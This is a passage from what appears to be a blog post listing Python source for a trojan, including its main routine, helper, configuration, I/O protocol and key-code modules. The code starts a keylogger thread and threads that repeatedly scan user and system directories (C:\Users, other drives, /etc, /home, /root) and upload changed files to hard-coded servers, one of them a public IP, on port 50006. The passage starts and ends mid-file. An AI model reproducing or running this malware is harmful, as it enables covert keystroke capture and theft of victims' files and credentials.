class="line">    <span class="comment"># clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span></span><br><span class="line">    <span class="comment"># clientSocket.connect((addr, port, ))</span></span><br><span class="line">    clientSocket = socket_connect(addr, port)</span><br><span class="line">    logging.debug(<span class="string">&#x27;try to get banner&#x27;</span>)</span><br><span class="line">    banner = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> banner[-<span class="number">1</span>:] != <span class="string">b&#x27;\0&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(banner, clientSocket)</span><br><span class="line">        banner += clientSocket.recv(<span class="number">1024</span>)</span><br><span class="line">    logging.debug(<span class="string">&#x27;get banner done&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> banner[:<span class="number">4</span>] == <span class="string">b&#x27;7RJN&#x27;</span>:</span><br><span class="line">        logging.debug(<span class="string">&#x27;banner correct&#x27;</span>)</span><br><span class="line">        handler = NetAPI(clientSocket)</span><br><span class="line">        <span class="keyword">for</span> filename <span class="keyword">in</span> scan_dir(start_dir):</span><br><span class="line">            filesize = os.path.getsize(filename)</span><br><span class="line">            filemtime = os.path.getmtime(filename)</span><br><span class="line">            signature = [filesize, filemtime]</span><br><span class="line">            <span class="keyword">if</span> visited.get(filename) == signature:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            handler.send_file(filename)</span><br><span class="line">            visited[filename] = signature</span><br><span class="line">        handler.close()</span><br><span class="line">    clientSocket.shutdown(socket.SHUT_WR)</span><br><span class="line">    clientSocket.close()</span><br><span class="line">    <span class="keyword">return</span> visited</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_dir_update</span>(<span class="params">addr, port, start_dir, signature=<span class="literal">None</span></span>):</span></span><br><span class="line">    visited = &#123;&#125;</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(signature, <span class="built_in">str</span>) <span class="keyword">and</span> os.path.exists(signature):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(signature) <span class="keyword">as</span> fp:</span><br><span class="line">            visited = json.load(fp)</span><br><span class="line">    visited = send_dir(addr, port, start_dir, visited=visited)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(signature, <span class="built_in">str</span>):</span><br><span class="line">        dirname = os.path.dirname(signature)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(dirname):</span><br><span class="line">            os.makedirs(dirname)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(signature, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">            json.dump(visited, fp)</span><br><span class="line">    <span class="keyword">return</span> visited</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_file_thread</span>(<span class="params">addr, port, logs, signature=<span class="literal">None</span></span>):</span></span><br><span class="line">    last_send = <span class="number">0.0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        curtime = time.time()</span><br><span class="line">        <span class="keyword">if</span> curtime - last_send &lt; update_interval:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        last_send = curtime</span><br><span class="line">        args = (addr, port, start_dirs,)</span><br><span class="line">        kwargs = &#123;<span class="string">&#x27;signature&#x27;</span>: signature, &#125;</span><br><span class="line">        thread = threading.Thread(target=send_dir_update, args=args, kwargs=kwargs, )</span><br><span class="line">        thread.start()</span><br><span class="line">        threads.append(thread)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_log_thread</span>(<span class="params">addr, port, logs, signature=<span class="literal">None</span></span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        send_dir_update(addr, port, logs, signature=signature)</span><br><span class="line">        time.sleep(keylog_interval)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    threads = []</span><br><span class="line">    trojan_dir = trojan_dirs.get(platform.system(), [])</span><br><span class="line">    start_dirs = upload_dirs.get(platform.system(), [])</span><br><span class="line">    keylogdir = keylogger_dirs.get(platform.system())</span><br><span class="line">    signature = <span class="literal">None</span></span><br><span class="line">    keylogsignature = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(trojan_dir, <span class="built_in">str</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(trojan_dir):</span><br><span class="line">            os.makedirs(trojan_dir)</span><br><span class="line">        signature = os.path.join(trojan_dir, <span class="string">&#x27;Signature.json&#x27;</span>)</span><br><span class="line">        keylogsignature = os.path.join(trojan_dir, <span class="string">&#x27;KeyLogger.json&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> keylogdir:</span><br><span class="line">        thread = threading.Thread(target=keylogger, args=(keylogdir, <span class="literal">False</span>,))</span><br><span class="line">        thread.start()</span><br><span class="line">        threads.append(thread)</span><br><span class="line">        args = (SERVERS, PORT, keylogdir,)</span><br><span class="line">        kwargs = &#123;<span class="string">&#x27;signature&#x27;</span>: keylogsignature&#125;</span><br><span class="line">        thread = threading.Thread(target=send_log_thread, args=args, kwargs=kwargs)</span><br><span class="line">        thread.start()</span><br><span class="line">        threads.append(thread)</span><br><span class="line">    <span class="keyword">if</span> start_dirs:</span><br><span class="line">        args = (SERVERS, PORT, start_dirs,)</span><br><span class="line">        kwargs = &#123;<span class="string">&#x27;signature&#x27;</span>: signature&#125;</span><br><span class="line">        thread = threading.Thread(target=send_file_thread, args=args, kwargs=kwargs)</span><br><span class="line">        thread.start()</span><br><span class="line">        threads.append(thread)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">        thread.join()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="common-py"><a href="#common-py" class="headerlink" title="common.py"></a>common.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># logging.basicConfig(level=logging.DEBUG)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Output</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, mode=<span class="literal">True</span></span>):</span></span><br><span class="line">        self.silentMode = mode</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.silentMode:</span><br><span class="line">            <span class="built_in">print</span>(*args, **kwargs)</span><br><span class="line">            sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set</span>(<span class="params">self, mode</span>):</span></span><br><span class="line">        self.silentMode = mode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">thread_refresh</span>(<span class="params">threads, result=<span class="literal">None</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> result:</span><br><span class="line">        result = []</span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(result, (<span class="built_in">list</span>, <span class="built_in">tuple</span>)):</span><br><span class="line">        result = [result]</span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(thread, (<span class="built_in">list</span>, <span class="built_in">tuple</span>)):</span><br><span class="line">            result = thread_refresh(thread, result)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        thread.join(<span class="number">0.1</span>)</span><br><span class="line">        <span class="keyword">if</span> thread.is_alive():</span><br><span class="line">            result.append(thread)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="config-py"><a href="#config-py" class="headerlink" title="config.py"></a>config.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">MAX_BANNER_LEN  = <span class="number">1024</span></span><br><span class="line">SILENT_MODE     = <span class="literal">True</span></span><br><span class="line">SERVERS         = [<span class="string">&#x27;111.122.27.61&#x27;</span>, <span class="string">&#x27;192.168.6.105&#x27;</span>]</span><br><span class="line">PORT            = <span class="number">50006</span></span><br><span class="line">trojan_dirs     = &#123;<span class="string">&#x27;Windows&#x27;</span>: <span class="string">&#x27;C:\\Trojan&#x27;</span>, <span class="string">&#x27;Linux&#x27;</span>: <span class="string">&#x27;/tmp&#x27;</span>&#125;</span><br><span class="line">keylogger_dirs  = &#123;<span class="string">&#x27;Windows&#x27;</span>: [<span class="string">&#x27;C:\\KeyLogger&#x27;</span>]&#125;</span><br><span class="line">upload_dirs     = &#123;<span class="string">&#x27;Windows&#x27;</span>: [<span class="string">&#x27;C:\\Users&#x27;</span>, <span class="string">&#x27;D:&#x27;</span>, <span class="string">&#x27;E:&#x27;</span>, <span class="string">&#x27;F:&#x27;</span>], <span class="string">&#x27;Linux&#x27;</span>: [<span class="string">&#x27;/etc&#x27;</span>, <span class="string">&#x27;/home&#x27;</span>, <span class="string">&#x27;/root&#x27;</span>]&#125;</span><br><span class="line">max_size        = <span class="number">16777216</span></span><br><span class="line">max_file        = <span class="number">0</span></span><br><span class="line">update_interval = <span class="number">3600</span></span><br><span class="line">keylog_interval = <span class="number">3</span></span><br><span class="line">save_dir        = &#123;<span class="string">&#x27;Windows&#x27;</span>: <span class="string">&#x27;C:\\temp&#x27;</span>, <span class="string">&#x27;Linux&#x27;</span>: <span class="string">&#x27;/tmp&#x27;</span>&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="inout-py"><a href="#inout-py" class="headerlink" title="inout.py"></a>inout.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))</span><br><span class="line">sys.path.insert(<span class="number">0</span>,os.path.join(BASE_DIR,<span class="string">&#x27;00网络编程&#x27;</span>))</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> common <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">InOutException</span>(<span class="params">Exception</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">INOUT</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, handle</span>):</span></span><br><span class="line">        self.handle    = handle</span><br><span class="line">        self.exceptTag = <span class="string">b&#x27;\\&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">data_to_nbyte</span>(<span class="params">self, n, exceptFlag=<span class="literal">False</span></span>):</span></span><br><span class="line">        exceptTag = &#123;<span class="literal">False</span>: <span class="string">b&#x27;&#x27;</span>, <span class="literal">True</span>:self.exceptTag&#125;.get(exceptFlag, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(n, <span class="built_in">int</span>):</span><br><span class="line">            <span class="keyword">if</span> n &lt; (<span class="number">1</span> &lt;&lt; <span class="number">8</span>):    tag  = <span class="string">&#x27;B&#x27;</span></span><br><span class="line">            <span class="keyword">elif</span> n &lt; (<span class="number">1</span> &lt;&lt; <span class="number">16</span>): tag  = <span class="string">&#x27;H&#x27;</span></span><br><span class="line">            <span class="keyword">elif</span> n &lt; (<span class="number">1</span> &lt;&lt; <span class="number">32</span>): tag  = <span class="string">&#x27;L&#x27;</span></span><br><span class="line">            <span class="keyword">elif</span> n &lt; (<span class="number">1</span> &lt;&lt; <span class="number">64</span>): tag  = <span class="string">&#x27;Q&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:               tag  = <span class="string">&#x27;U&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> tag != <span class="string">&#x27;U&#x27;</span>:</span><br><span class="line">                n     = struct.pack(<span class="string">&#x27;!&#x27;</span> + tag, n)</span><br><span class="line">                nbyte = tag.encode(<span class="string">&#x27;utf-8&#x27;</span>) + n</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                b     = bignum_to_bytes(n)</span><br><span class="line">                nbyte = tag.encode(<span class="string">&#x27;utf-8&#x27;</span>) + self.data_to_nbyte(<span class="built_in">len</span>(b)) + b</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">isinstance</span>(n, <span class="built_in">bytes</span>):</span><br><span class="line">            tag, b  = <span class="string">&#x27;s&#x27;</span>, n</span><br><span class="line">            nbyte = tag.encode(<span class="string">&#x27;utf-8&#x27;</span>) + self.data_to_nbyte(<span class="built_in">len</span>(b)) + b</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">isinstance</span>(n, <span class="built_in">str</span>):</span><br><span class="line">            tag, b  = <span class="string">&#x27;c&#x27;</span>, n.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            nbyte = tag.encode(<span class="string">&#x27;utf-8&#x27;</span>) + self.data_to_nbyte(<span class="built_in">len</span>(b)) + b</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">&#x27;data_to_nbyte: Invalid type: &#x27;</span> + <span class="built_in">type</span>(tag))</span><br><span class="line">        <span class="keyword">if</span> exceptFlag: logging.debug(<span class="string">&#x27;send exception: %s&#x27;</span>, nbyte)</span><br><span class="line">        <span class="keyword">return</span> exceptTag + nbyte</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">nbyte_to_data</span>(<span class="params">self</span>):</span></span><br><span class="line">        size_info  = &#123; <span class="string">&#x27;B&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;H&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;L&#x27;</span>:<span class="number">4</span>, <span class="string">&#x27;Q&#x27;</span>:<span class="number">8</span> &#125;</span><br><span class="line">        valendata  = &#123; <span class="string">&#x27;s&#x27;</span>: <span class="keyword">lambda</span> n: n,</span><br><span class="line">                       <span class="string">&#x27;c&#x27;</span>: <span class="keyword">lambda</span> n: n.decode(<span class="string">&#x27;utf-8&#x27;</span>),</span><br><span class="line">                       <span class="string">&#x27;U&#x27;</span>: <span class="keyword">lambda</span> n: bytes_to_bignum(n), &#125;</span><br><span class="line">        btag       = self.read_raw(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> btag:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        exceptFlag = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> btag == self.exceptTag:</span><br><span class="line">            exceptFlag = <span class="literal">True</span></span><br><span class="line">            btag       = self.read_raw(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> btag:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        tag          = btag.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> tag <span class="keyword">in</span> size_info:</span><br><span class="line">            size         = size_info[tag]</span><br><span class="line">            bnum         = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">while</span> <span class="built_in">len</span>(bnum) &lt; size:</span><br><span class="line">                bnum    += self.read_raw(size - <span class="built_in">len</span>(bnum))</span><br><span class="line">            result       = struct.unpack(<span class="string">&#x27;!&#x27;</span> + tag, bnum)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">elif</span> tag <span class="keyword">in</span> valendata:</span><br><span class="line">            size = self.nbyte_to_data()</span><br><span class="line">            <span class="keyword">if</span> size &gt;= <span class="number">65536</span>:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">&#x27;length too long: &#x27;</span> + <span class="built_in">str</span>(size))</span><br><span class="line">            bstr         = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">while</span> <span class="built_in">len</span>(bstr) &lt; size:</span><br><span class="line">                bstr    += self.read_raw(size - <span class="built_in">len</span>(bstr))</span><br><span class="line">            <span class="comment"># result       = bstr if tag == &#x27;s&#x27; else bstr.decode(&#x27;utf-8&#x27;)</span></span><br><span class="line">            result       = valendata[tag](bstr)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">&#x27;nbyte_to_data: Invalid type: &#x27;</span> + tag)</span><br><span class="line">        <span class="keyword">if</span> exceptFlag:</span><br><span class="line">            logging.debug(<span class="string">&#x27;recv exception: %s&#x27;</span>, result)</span><br><span class="line">            <span class="keyword">raise</span> InOutException(result)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">self</span>):</span></span><br><span class="line">        d = self.nbyte_to_data()</span><br><span class="line">        <span class="keyword">return</span> d</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">self, d, exceptFlag=<span class="literal">False</span></span>):</span></span><br><span class="line">        byte_data = self.data_to_nbyte(d, exceptFlag)</span><br><span class="line">        self.write_raw(byte_data)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read_raw</span>(<span class="params">self, n</span>):</span></span><br><span class="line">        d = self.read_handle(n)</span><br><span class="line">        <span class="keyword">return</span> d</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">write_raw</span>(<span class="params">self, d</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.write_handle(d)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">close</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.close_handle()</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read_handle</span>(<span class="params">self, n</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">write_handle</span>(<span class="params">self, d</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(d)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">close_handle</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.handle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NetworkIO</span>(<span class="params">INOUT</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read_handle</span>(<span class="params">self, n</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> self.handle.recv(n)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            logging.debug(<span class="string">&#x27;Exception: %s&#x27;</span>, <span class="built_in">str</span>(e))</span><br><span class="line">            <span class="keyword">raise</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">write_handle</span>(<span class="params">self, d</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> self.handle.send(d)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            logging.debug(<span class="string">&#x27;Exception: %s&#x27;</span>, <span class="built_in">str</span>(e))</span><br><span class="line">            <span class="keyword">raise</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">close_handle</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileIO</span>(<span class="params">INOUT</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read_handle</span>(<span class="params">self, n</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.handle.read(n)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">write_handle</span>(<span class="params">self, d</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.handle.write(d)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StringIO</span>(<span class="params">INOUT</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read_handle</span>(<span class="params">self, n</span>):</span></span><br><span class="line">        data, self.handle = self.handle[:n], self.handle[n:]</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">write_handle</span>(<span class="params">self, d</span>):</span></span><br><span class="line">        self.handle += d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">InitIO</span>(<span class="params">handle</span>):</span></span><br><span class="line">    readers = &#123;</span><br><span class="line">        <span class="built_in">bytes</span>:         StringIO,</span><br><span class="line">        io.IOBase:     FileIO,</span><br><span class="line">        socket.socket: NetworkIO,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> readers.get(<span class="built_in">type</span>(handle), <span class="keyword">lambda</span> n: <span class="literal">None</span>)(handle)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bignum_to_bytes</span>(<span class="params">n</span>):</span></span><br><span class="line">    result = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">        b = n % <span class="number">128</span></span><br><span class="line">        n &gt;&gt;= <span class="number">7</span></span><br><span class="line">        <span class="keyword">if</span> n:</span><br><span class="line">            b += <span class="number">128</span></span><br><span class="line">        result += <span class="built_in">bytes</span>([b])</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bytes_to_bignum</span>(<span class="params">bs</span>):</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    exp    = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> bs:</span><br><span class="line">        n = b % <span class="number">128</span></span><br><span class="line">        result += n &lt;&lt; exp</span><br><span class="line">        exp += <span class="number">7</span></span><br><span class="line">        <span class="keyword">if</span> b &amp; (<span class="number">1</span> &lt;&lt; <span class="number">7</span>) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>

<h2 id="keydef-py"><a href="#keydef-py" class="headerlink" title="keydef.py"></a>keydef.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">VK_LBUTTON             = <span class="number">0x01</span></span><br><span class="line">VK_RBUTTON             = <span class="number">0x02</span></span><br><span class="line">VK_CANCEL              = <span class="number">0x03</span>   <span class="comment"># Cancel</span></span><br><span class="line">VK_MBUTTON             = <span class="number">0x04</span></span><br><span class="line">VK_XBUTTON1            = <span class="number">0x05</span></span><br><span class="line">VK_XBUTTON2            = <span class="number">0x06</span></span><br><span class="line">VK_BACK                = <span class="number">0x08</span>   <span class="comment"># Backspace</span></span><br><span class="line">VK_TAB                 = <span class="number">0x09</span>   <span class="comment"># Tab</span></span><br><span class="line">VK_CLEAR               = <span class="number">0x0C</span>   <span class="comment"># Clear</span></span><br><span class="line">VK_RETURN              = <span class="number">0x0D</span>   <span class="comment"># Enter</span></span><br><span class="line">VK_SHIFT               = <span class="number">0x10</span>   <span class="comment"># Shift</span></span><br><span class="line">VK_CONTROL             = <span class="number">0x11</span>   <span class="comment"># Ctrl</span></span><br><span class="line">VK_MENU                = <span class="number">0x12</span>   <span class="comment"># Alt</span></span><br><span class="line">VK_PAUSE               = <span class="number">0x13</span>   <span class="comment"># Pause</span></span><br><span class="line">VK_CAPITAL             = <span class="number">0x14</span>   <span class="comment"># CapsLock</span></span><br><span class="line">VK_KANA                = <span class="number">0x15</span></span><br><span class="line">VK_HANGUEL             = <span class="number">0x15</span></span><br><span class="line">VK_HANGUL              = <span class="number">0x15</span></span><br><span class="line">VK_JUNJA               = <span class="number">0x17</span></span><br><span class="line">VK_FINAL               = <span class="number">0x18</span></span><br><span class="line">VK_HANJA               = <span class="number">0x19</span></span><br><span class="line">VK_KANJI               = <span class="number">0x19</span></span><br><span class="line">VK_ESCAPE              = <span class="number">0x1B</span>   <span class="comment"># Esc</span></span><br><span class="line">VK_CONVERT             = <span class="number">0x1C</span></span><br><span class="line">VK_NONCONVERT          = <span class="number">0x1D</span></span><br><span class="line">VK_ACCEPT              = <span class="number">0x1E</span></span><br><span class="line">VK_MODECHANGE          = <span class="number">0x1F</span></span><br><span class="line">VK_SPACE               = <span class="number">0x20</span>   <span class="comment"># SPACE</span></span><br><span class="line">VK_PRIOR               = <span class="number">0x21</span>   <span class="comment"># PageUp</span></span><br><span class="line">VK_NEXT                = <span class="number">0x22</span>   <span class="comment"># PageDown</span></span><br><span class="line">VK_END                 = <span class="number">0x23</span>   <span class="comment"># End</span></span><br><span class="line">VK_HOME                = <span class="number">0x24</span>   <span class="comment"># Home</span></span><br><span class="line">VK_LEFT                = <span class="number">0x25</span>   <span class="comment"># Left</span></span><br><span class="line">VK_UP                  = <span class="number">0x26</span>   <span class="comment"># Up</span></span><br><span class="line">VK_RIGHT               = <span class="number">0x27</span>   <span class="comment"># Right</span></span><br><span class="line">VK_DOWN                = <span class="number">0x28</span>   <span class="comment"># Down</span></span><br><span class="line">VK_SELECT              = <span class="number">0x29</span>   <span class="comment"># Select</span></span><br><span class="line">VK_PRINT               = <span class="number">0x2A</span>   <span class="comment"># Print</span></span><br><span class="line">VK_EXECUTE             = <span class="number">0x2B</span>   <span class="comment"># Execute</span></span><br><span class="line">VK_SNAPSHOT            = <span class="number">0x2C</span>   <span class="comment"># PrintScreen</span></span><br><span class="line">VK_INSERT              = <span class="number">0x2D</span></span><br><span class="line">VK_DELETE              = <span class="number">0x2E</span></span><br><span class="line">VK_HELP                = <span class="number">0x2F</span></span><br><span class="line">VK_0                   = <span class="number">0x30</span>   <span class="comment"># 0 [SHIFT] )</span></span><br><span class="line">VK_1                   = <span class="number">0x31</span>   <span class="comment"># 1 [SHIFT] !</span></span><br><span class="line">VK_2                   = <span class="number">0x32</span>   <span class="comment"># 2 [SHIFT] @</span></span><br><span class="line">VK_3                   = <span class="number">0x33</span>   <span class="comment"># 3 [SHIFT] #</span></span><br><span class="line">VK_4                   = <span class="number">0x34</span>   <span class="comment"># 4 [SHIFT] $</span></span><br><span class="line">VK_5                   = <span class="number">0x35</span>   <span class="comment"># 5 [SHIFT] %</span></span><br><span class="line">VK_6                   = <span class="number">0x36</span>   <span class="comment"># 6 [SHIFT] ^</span></span><br><span class="line">VK_7                   = <span class="number">0x37</span>   <span class="comment"># 7 [SHIFT] &amp;</span></span><br><span class="line">VK_8                   = <span class="number">0x38</span>   <span class="comment"># 8 [SHIFT] *</span></span><br><span class="line">VK_9                   = <span class="number">0x39</span>   <span class="comment"># 9 [SHIFT] (</span></span><br><span class="line">VK_A                   = <span class="number">0x41</span>   <span class="comment"># a [UPPER] A</span></span><br><span class="line">VK_B                   = <span class="number">0x42</span>   <span class="comment"># b [UPPER] B</span></span><br><span class="line">VK_C                   = <span class="number">0x43</span>   <span class="comment"># c [UPPER] C</span></span><br><span class="line">VK_D                   = <span class="number">0x44</span>   <span class="comment"># d [UPPER] D</span></span><br><span class="line">VK_E                   = <span class="number">0x45</span>   <span class="comment"># e [UPPER] E</span></span><br><span class="line">VK_F                   = <span class="number">0x46</span>   <span class="comment"># f [UPPER] F</span></span><br><span class="line">VK_G                   = <span class="number">0x47</span>   <span class="comment"># g [UPPER] G</span></span><br><span class="line">VK_H                   = <span class="number">0x48</span>   <span class="comment"># h [UPPER] H</span></span><br><span class="line">VK_I                   = <span class="number">0x49</span>   <span class="comment"># i [UPPER] I</span></span><br><span class="line">VK_J                   = <span class="number">0x4A</span>   <span class="comment"># j [UPPER] J</span></span><br><span class="line">VK_K                   = <span class="number">0x4B</span>   <span class="comment"># k [UPPER] K</span></span><br><span class="line">VK_L                   = <span class="number">0x4C</span>   <span class="comment"># l [UPPER] L</span></span><br><span class="line">VK_M                   = <span class="number">0x4D</span>   <span class="comment"># m [UPPER] M</span></span><br><span class="line">VK_N                   = <span class="number">0x4E</span>   <span class="comment"># n [UPPER] N</span></span><br><span class="line">VK_O                   = <span class="number">0x4F</span>   <span class="comment"># o [UPPER] O</span></span><br><span class="line">VK_P                   = <span class="number">0x50</span>   <span class="comment"># p [UPPER] P</span></span><br><span class="line">VK_Q                   = <span class="number">0x51</span>   <span class="comment"># q [UPPER] Q</span></span><br><span class="line">VK_R                   = <span class="number">0x52</span>   <span class="comment"># r [UPPER] R</span></span><br><span class="line">VK_S                   = <span class="number">0x53</span>   <span class="comment"># s [UPPER] S</span></span><br><span class="line">VK_T                   = <span class="number">0x54</span>   <span class="comment"># t [UPPER] T</span></span><br><span class="line">VK_U                   = <span class="number">0x55</span>   <span class="comment"># u [UPPER] U</span></span><br><span class="line">VK_V                   = <span class="number">0x56</span>   <span class="comment"># v [UPPER] V</span></span><br><span class="line">VK_W                   = <span class="number">0x57</span>   <span class="comment"># w [UPPER] 